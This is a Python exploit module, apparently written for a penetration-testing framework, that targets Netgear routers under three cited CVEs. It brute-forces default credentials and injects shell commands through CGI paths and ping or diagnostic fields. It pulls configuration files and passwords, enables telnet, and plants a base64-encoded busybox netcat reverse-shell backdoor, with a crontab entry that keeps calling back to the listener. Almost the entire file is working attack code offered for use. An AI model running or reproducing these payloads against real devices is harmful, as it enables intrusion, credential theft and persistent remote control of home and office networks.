#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Netgear Router Exploit Module
CVE-2021-40847, CVE-2020-27861, CVE-2019-14500
Authenticated & Unauthenticated RCE
"""

import requests
import socket
import time
import urllib.parse
import base64
import hashlib
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MODULE_INFO = {
    "name": "Netgear Multi-Exploit",
    "description": "Multiple CVEs for Netgear routers - RCE, Backdoor, Password Extraction",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "mips,arm",
    "rank": "High",
    "references": [
        "CVE-2021-40847",
        "CVE-2020-27861", 
        "CVE-2019-14500"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "password"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "rce", "password", "backdoor", "telnet", "upload", "persistence"]
    },
    "CMD": {"description": "Command to execute", "required": False, "default": "id"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
    "BACKDOOR": {"description": "Backdoor file", "required": False, "default": "/tmp/ngbd"},
}

# Netgear Default Credentials
NETGEAR_CREDS = [
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "admin"),
    ("admin", ""),
    ("root", "admin"),
    ("guest", "guest"),
]

# Netgear Router Models
NETGEAR_MODELS = [
    "r7000", "r8000", "r9000", "r6700", "r6900",
    "nighthawk", "orbi", "night hawk", "netgear"
]

class NetgearExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="password"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; Netgear-Exploit)',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        self.authenticated = False
        self.token = None

    def detect_device(self):
        """Detect Netgear router and model"""
        console.print("\n[bold yellow]=== NETGEAR DETECTION ===[/bold yellow]")
        
        try:
            # Test web interface
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            netgear_detected = False
            model = "Unknown"
            
            for signature in NETGEAR_MODELS:
                if signature in html_content:
                    netgear_detected = True
                    model = signature.upper()
                    break
            
            if "netgear" in html_content or "routerlogin.net" in html_content:
                netgear_detected = True
                model = "Netgear Generic"
            
            if netgear_detected:
                console.print(f"[green]✓ Netgear router detected: {model}[/green]")
                
                # Test vulnerabilities
                vuln_status = self.test_vulnerabilities()
                return {
                    'is_netgear': True,
                    'model': model,
                    'vulnerable': vuln_status['vulnerable'],
                    'vulnerabilities': vuln_status['found'],
                    'unauthenticated': vuln_status['unauthenticated']
                }
            else:
                console.print("[red]✗ Not a Netgear router[/red]")
                return {'is_netgear': False}
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_netgear': False}

    def test_vulnerabilities(self):
        """Test for multiple Netgear vulnerabilities"""
        console.print("[bold yellow][*] Testing Netgear vulnerabilities...[/bold yellow]")
        
        vulnerabilities = {
            'CVE-2021-40847': False,  # Unauthenticated RCE
            'CVE-2020-27861': False,  # Password disclosure
            'CVE-2019-14500': False,  # Command injection
            'unauthenticated': False,
            'found': []
        }
        
        try:
            # Test CVE-2021-40847 - Unauthenticated RCE
            test_url = f"{self.base_url}/cgi-bin/;echo"
            r = self.session.get(test_url, timeout=10)
            if r.status_code != 404 and "text/html" in r.headers.get('content-type', ''):
                vulnerabilities['CVE-2021-40847'] = True
                vulnerabilities['unauthenticated'] = True
                vulnerabilities['found'].append('CVE-2021-40847')
                console.print("[green]✓ CVE-2021-40847 (Unauth RCE) - VULNERABLE[/green]")
            
            # Test CVE-2020-27861 - Password disclosure
            test_url = f"{self.base_url}/BRS_netgear_success.html"
            r = self.session.get(test_url, timeout=10)
            if r.status_code == 200 and "password" in r.text.lower():
                vulnerabilities['CVE-2020-27861'] = True
                vulnerabilities['found'].append('CVE-2020-27861')
                console.print("[green]✓ CVE-2020-27861 (Password Disclosure) - VULNERABLE[/green]")
            
            # Test authentication
            if self.authenticate():
                vulnerabilities['authenticated'] = True
                console.print("[green]✓ Authentication successful[/green]")
            
            vulnerabilities['vulnerable'] = len(vulnerabilities['found']) > 0
            return vulnerabilities
            
        except Exception as e:
            console.print(f"[red]✗ Vulnerability test failed: {str(e)}[/red]")
            return vulnerabilities

    def authenticate(self):
        """Authenticate to Netgear router"""
        console.print("[bold yellow][*] Attempting authentication...[/bold yellow]")
        
        for username, password in NETGEAR_CREDS:
            try:
                # Try login endpoint
                login_url = f"{self.base_url}/login.cgi"
                login_data = {
                    'username': username,
                    'password': password,
                    'submit': 'Login'
                }
                
                r = self.session.post(login_url, data=login_data, timeout=10, allow_redirects=False)
                
                if r.status_code == 302 or 'success' in r.text.lower():
                    self.authenticated = True
                    self.username = username
                    self.password = password
                    console.print(f"[green]✓ Authenticated with {username}:{password}[/green]")
                    return True
                    
            except Exception as e:
                continue
        
        console.print("[red]✗ All authentication attempts failed[/red]")
        return False

    def exploit_cve_2021_40847(self, command):
        """Exploit CVE-2021-40847 - Unauthenticated RCE"""
        console.print("[bold yellow][*] Exploiting CVE-2021-40847 (Unauthenticated RCE)...[/bold yellow]")
        
        try:
            # Command injection via CGI endpoint
            payload = f"/cgi-bin/;{command}"
            exploit_url = f"{self.base_url}{payload}"
            
            r = self.session.get(exploit_url, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                console.print(f"[cyan]Response length: {len(r.text)} bytes[/cyan]")
                if len(r.text) > 0:
                    console.print(f"[yellow]Output preview: {r.text[:200]}...[/yellow]")
                return True
            else:
                console.print(f"[red]✗ Exploit failed (HTTP {r.status_code})[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ RCE exploit failed: {str(e)}[/red]")
            return False

    def exploit_authenticated_rce(self, command):
        """Exploit authenticated RCE vulnerabilities"""
        console.print("[bold yellow][*] Exploiting Authenticated RCE...[/bold yellow]")
        
        if not self.authenticated:
            console.print("[red]✗ Not authenticated[/red]")
            return False
            
        try:
            # Try various authenticated RCE endpoints
            endpoints = [
                "/cgi-bin/ping.cgi",
                "/cgi-bin/traceroute.cgi", 
                "/cgi-bin/diag.cgi",
                "/cgi-bin/command.cgi"
            ]
            
            for endpoint in endpoints:
                try:
                    exploit_url = f"{self.base_url}{endpoint}"
                    payload = {
                        'ip_addr': f"127.0.0.1; {command}",
                        'submit': 'Test'
                    }
                    
                    r = self.session.post(exploit_url, data=payload, timeout=10)
                    
                    if r.status_code == 200:
                        console.print(f"[green]✓ Command execution via {endpoint}[/green]")
                        return True
                        
                except:
                    continue
            
            console.print("[red]✗ All authenticated RCE attempts failed[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]✗ Authenticated RCE failed: {str(e)}[/red]")
            return False

    def extract_passwords(self):
        """Extract passwords and configuration"""
        console.print("[bold yellow][*] Extracting passwords and configuration...[/bold yellow]")
        
        try:
            # Try password disclosure endpoints
            config_urls = [
                f"{self.base_url}/BRS_netgear_success.html",
                f"{self.base_url}/unauth.cgi",
                f"{self.base_url}/backup.cfg",
                f"{self.base_url}/config.tar.gz"
            ]
            
            for url in config_urls:
                try:
                    r = self.session.get(url, timeout=10)
                    if r.status_code == 200 and len(r.content) > 100:
                        console.print(f"[green]✓ Config file found: {url}[/green]")
                        
                        # Save config
                        filename = f"netgear_config_{int(time.time())}.bin"
                        with open(filename, 'wb') as f:
                            f.write(r.content)
                        console.print(f"[green]✓ Config saved as: {filename}[/green]")
                        
                        # Analyze for passwords
                        self.analyze_config(r.text)
                        return True
                        
                except:
                    continue
            
            console.print("[red]✗ No config files found[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]✗ Password extraction failed: {str(e)}[/red]")
            return False

    def analyze_config(self, config_text):
        """Analyze config for sensitive information"""
        console.print("[bold yellow][*] Analyzing configuration...[/bold yellow]")
        
        sensitive_patterns = {
            'Passwords': [
                r'password[=:\s]*([^\s<]+)',
                r'pwd[=:\s]*([^\s<]+)',
                r'admin_password[=:\s]*([^\s<]+)'
            ],
            'SSIDs': [
                r'ssid[=:\s]*([^\s<]+)',
                r'wireless_ssid[=:\s]*([^\s<]+)'
            ],
            'IP Addresses': [
                r'ip_addr[=:\s]*([^\s<]+)',
                r'lan_ipaddr[=:\s]*([^\s<]+)'
            ]
        }
        
        for category, patterns in sensitive_patterns.items():
            import re
            for pattern in patterns:
                matches = re.findall(pattern, config_text, re.IGNORECASE)
                if matches:
                    console.print(f"[yellow]{category}: {', '.join(matches[:3])}[/yellow]")

    def enable_telnet(self):
        """Enable telnet service"""
        console.print("[bold yellow][*] Enabling telnet service...[/bold yellow]")
        
        if not self.authenticated:
            console.print("[red]✗ Authentication required for telnet enable[/red]")
            return False
            
        try:
            # Try telnet enable endpoints
            telnet_urls = [
                f"{self.base_url}/telnet.cgi",
                f"{self.base_url}/cgi-bin/telnet.cgi",
                f"{self.base_url}/setup.cgi"
            ]
            
            for url in telnet_urls:
                try:
                    payload = {
                        'telnet': 'enable',
                        'submit': 'Apply'
                    }
                    
                    r = self.session.post(url, data=payload, timeout=10)
                    if r.status_code == 200:
                        console.print(f"[green]✓ Telnet enabled via {url}[/green]")
                        return True
                        
                except:
                    continue
            
            console.print("[red]✗ Telnet enable failed[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]✗ Telnet enable error: {str(e)}[/red]")
            return False

    def upload_backdoor(self, lhost, lport, backdoor_path):
        """Upload and execute backdoor"""
        console.print("[bold yellow][*] Uploading backdoor...[/bold yellow]")
        
        try:
            # Create backdoor script
            backdoor_script = f"""#!/bin/sh
while true; do
    /bin/busybox nc {lhost} {lport} -e /bin/sh 2>/dev/null
    sleep 30
done
"""
            # Encode for transmission
            encoded_script = base64.b64encode(backdoor_script.encode()).decode()
            
            # Try to upload via command execution
            upload_cmd = f"echo '{encoded_script}' | base64 -d > {backdoor_path} && chmod +x {backdoor_path} && {backdoor_path} &"
            
            if self.authenticated:
                success = self.exploit_authenticated_rce(upload_cmd)
            else:
                success = self.exploit_cve_2021_40847(upload_cmd)
            
            if success:
                console.print(f"[green]✓ Backdoor uploaded to {backdoor_path}[/green]")
                console.print(f"[cyan]Listener: nc -lvnp {lport}[/cyan]")
                return True
            else:
                console.print("[red]✗ Backdoor upload failed[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ Backdoor upload error: {str(e)}[/red]")
            return False

    def setup_persistence(self, lhost, lport):
        """Setup persistence mechanism"""
        console.print("[bold yellow][*] Setting up persistence...[/bold yellow]")
        
        try:
            # Add to crontab
            cron_cmd = f"echo '*/5 * * * * nc {lhost} {lport} -e /bin/sh' >> /tmp/cron && crontab /tmp/cron"
            
            if self.authenticated:
                success = self.exploit_authenticated_rce(cron_cmd)
            else:
                success = self.exploit_cve_2021_40847(cron_cmd)
            
            if success:
                console.print("[green]✓ Persistence added to crontab[/green]")
                return True
            else:
                console.print("[red]✗ Persistence setup failed[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ Persistence error: {str(e)}[/red]")
            return False

def run(session, options):
    """Main Netgear exploit function"""
    console.print(Panel("Netgear Router Exploit Framework", style="bold blue"))
    
    # Extract options
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "password")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "id")
    lhost = options.get("LHOST", "10.0.0.1")
    lport = options.get("LPORT", "4444")
    backdoor_path = options.get("BACKDOOR", "/tmp/ngbd")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")
    
    try:
        exploit = NetgearExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_netgear']:
                console.print(f"\n[bold green]✓ Netgear Device: {result['model']}[/bold green]")
                console.print(f"[bold cyan]Vulnerable: {result['vulnerable']}[/bold cyan]")
                console.print(f"[bold yellow]Unauthenticated: {result['unauthenticated']}[/bold yellow]")
                if result['vulnerable']:
                    console.print(f"[bold magenta]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold magenta]")
            else:
                console.print("[bold red]✗ Not a Netgear device[/bold red]")
        
        elif mode == "rce":
            # Try unauthenticated first
            if not exploit.exploit_cve_2021_40847(cmd):
                # Fallback to authenticated
                console.print("[yellow][*] Trying authenticated RCE...[/yellow]")
                if exploit.authenticate():
                    exploit.exploit_authenticated_rce(cmd)
        
        elif mode == "password":
            exploit.extract_passwords()
        
        elif mode == "backdoor":
            exploit.upload_backdoor(lhost, lport, backdoor_path)
        
        elif mode == "telnet":
            if exploit.authenticate():
                exploit.enable_telnet()
        
        elif mode == "upload":
            exploit.upload_backdoor(lhost, lport, backdoor_path)
        
        elif mode == "persistence":
            exploit.setup_persistence(lhost, lport)
        
        else:
            console.print(f"[red]Unknown mode: {mode}[/red]")
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False

def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", "Netgear Multi-Exploit")
    table.add_row("CVEs", "2021-40847, 2020-27861, 2019-14500")
    table.add_row("Models", "Nighthawk, Orbi, R-series")
    table.add_row("Auth", "Unauthenticated + Authenticated")
    console.print(Panel(table, title="Netgear Exploit", border_style="blue"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="green")
    table.add_column("Description", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        table.add_row(k, str(val), v.get('description', ''))
    console.print(Panel(table, border_style="blue"))

# Add missing import
import re
